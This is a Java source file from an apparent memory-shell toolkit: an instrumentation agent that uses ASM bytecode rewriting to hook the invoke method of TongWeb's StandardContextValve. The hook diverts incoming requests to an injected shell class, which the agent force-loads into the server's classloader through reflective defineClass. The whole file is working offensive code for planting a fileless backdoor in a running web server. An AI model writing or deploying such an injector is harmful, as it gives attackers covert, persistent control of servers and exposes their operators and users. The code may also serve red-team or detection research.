package com.reajason.javaweb.memshell.injector.tongweb;

import org.objectweb.asm.*;
import org.objectweb.asm.commons.AdviceAdapter;
import org.objectweb.asm.commons.Method;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

/**
 * @author ReaJason
 * @since 2025/3/26
 */
public class TongWebContextValveAgentInjector implements ClassFileTransformer {
    private static final String TARGET_CLASS = "com/tongweb/web/thor/core/StandardContextValve";
    private static final String TARGET_CLASS_1 = "com/tongweb/catalina/core/StandardContextValve";
    private static final String TARGET_METHOD_NAME = "invoke";

    public static String getClassName() {
        return "{{advisorName}}";
    }

    public static void premain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    private static void launch(Instrumentation inst) throws Exception {
        System.out.println("MemShell Agent is starting");
        inst.addTransformer(new TongWebContextValveAgentInjector(), true);
        for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
            String name = allLoadedClass.getName();
            if (TARGET_CLASS.replace("/", ".").equals(name)
                    || TARGET_CLASS_1.replace("/", ".").equals(name)) {
                inst.retransformClasses(allLoadedClass);
            }
        }
        System.out.println("MemShell Agent is working at com.tongweb.web.thor.core.StandardContextValve.invoke");
    }

    @Override
    @SuppressWarnings("all")
    public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] bytes) {
        if (TARGET_CLASS.equals(className) || TARGET_CLASS_1.equals(className)) {
            defineTargetClass(loader);
            try {
                ClassReader cr = new ClassReader(bytes);
                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
                    @Override
                    protected ClassLoader getClassLoader() {
                        return loader;
                    }
                };
                ClassVisitor cv = getClassVisitor(cw);
                cr.accept(cv, ClassReader.EXPAND_FRAMES);
                return cw.toByteArray();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return bytes;
    }

    @SuppressWarnings("all")
    public static ClassVisitor getClassVisitor(ClassVisitor cv) {
        return new ClassVisitor(Opcodes.ASM9, cv) {
            @Override
            public MethodVisitor visitMethod(int access, String name, String descriptor,
                                             String signature, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                if (TARGET_METHOD_NAME.equals(name) && descriptor.endsWith(")V")) {
                    try {
                        return new CustomMethodVisitor(mv, access, name, descriptor);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                return mv;
            }
        };
    }

    @SuppressWarnings("all")
    public static class CustomMethodVisitor extends AdviceAdapter {
        private static final Method CUSTOM_EQUALS_CONSTRUCTOR = Method.getMethod("void <init> ()");
        private static final Method CUSTOM_EQUALS_METHOD = Method.getMethod("boolean equals (java.lang.Object)");
        private final Type customEqualsType;

        protected CustomMethodVisitor(MethodVisitor mv, int access, String name, String descriptor) {
            super(Opcodes.ASM9, mv, access, name, descriptor);
            customEqualsType = Type.getObjectType(getClassName().replace('.', '/'));
        }

        @Override
        protected void onMethodEnter() {
            loadArgArray();
            newInstance(customEqualsType);
            dup();
            invokeConstructor(customEqualsType, CUSTOM_EQUALS_CONSTRUCTOR);
            swap();
            invokeVirtual(customEqualsType, CUSTOM_EQUALS_METHOD);
            Label skipReturnLabel = new Label();
            mv.visitJumpInsn(IFEQ, skipReturnLabel);
            mv.visitInsn(RETURN);
            mark(skipReturnLabel);
        }
    }

    @SuppressWarnings("all")
    public void defineTargetClass(ClassLoader loader) {
        byte[] classBytecode = new byte[0];
        InputStream is = null;
        try {
            is = this.getClass().getClassLoader().getResourceAsStream(getClassName().replace('.', '/') + ".class");
            if (is == null) {
                return;
            }
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = is.read(buffer)) != -1) {
                baos.write(buffer, 0, len);
            }
            classBytecode = baos.toByteArray();
        } catch (Exception ignored) {

        } finally {
            if (is != null) {
                try {
                    is.close();
                } catch (Exception ignored) {
                }
            }
        }
        try {
            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            defineClass.invoke(loader, classBytecode, 0, classBytecode.length);
        } catch (Exception ignored) {
        }
    }
}
